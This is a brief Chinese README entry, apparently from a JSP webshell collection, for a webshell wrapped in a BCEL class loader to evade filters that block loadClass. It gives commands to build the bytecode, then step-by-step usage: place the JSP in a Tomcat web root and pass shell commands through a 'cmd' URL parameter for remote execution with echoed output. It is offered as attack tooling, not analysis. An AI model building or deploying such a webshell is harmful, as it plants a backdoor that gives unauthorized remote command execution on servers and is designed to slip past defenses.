### BCEL类加载器进行一定包装-可能在某些禁了loadClass方法的地方bypass的JSP WebShell

生成BCEL字节码：
```
javac EvilMake.class Evil15.class
java EvilMake
```

使用：
```
1.把jsp文件放到能被解析的服务器目录，例：tomcat的webapps/ROOT

2.在浏览器访问15.jsp，并使用参数cmd传入需要远程执行的命令，例：http://127.0.0.1:8080/15.jsp?cmd=whoami

3.服务器将会执行相应的shell命令，最后回显
```